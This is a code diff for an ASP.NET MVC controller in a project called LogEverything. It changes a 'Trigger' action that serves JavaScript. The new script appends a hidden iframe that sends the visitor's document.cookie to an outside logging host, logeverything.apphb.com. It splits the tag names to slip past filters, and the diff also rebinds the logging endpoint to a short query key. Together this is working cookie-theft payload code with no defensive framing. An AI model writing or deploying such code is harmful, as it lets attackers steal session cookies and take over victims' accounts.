@@ -23,7 +23,7 @@ namespace LogEverything.Controllers
 
         //
         // GET: /log/
-        public ActionResult Write(string content)
+        public ActionResult Write([Bind(Prefix = "c")]string content)
         {
             var result = new LogResult { ErrorCode = 0, ErrorMsg = "" };
             do
@@ -65,7 +65,7 @@ namespace LogEverything.Controllers
         // GET: /trigger/
         public ActionResult Trigger()
         {
-            return JavaScript("document.write('<ifr'+'ame s'+'rc=\"http://logeverything.apphb.com/log/'+encodeURI(document.cookie)+'\" st'+'yle=\"dis'+'play:none;\"'+'>'+'</ifra'+'me>');");
+            return JavaScript("$('body').append('<ifr'+'ame src=\'http://logeverything.apphb.com/log?c='+encodeURI(document.cookie)+'\' style=\'display:none;\'></ifr'+'ame>')");
         }
 
         protected virtual JsonNetResult JsonNet(object data)
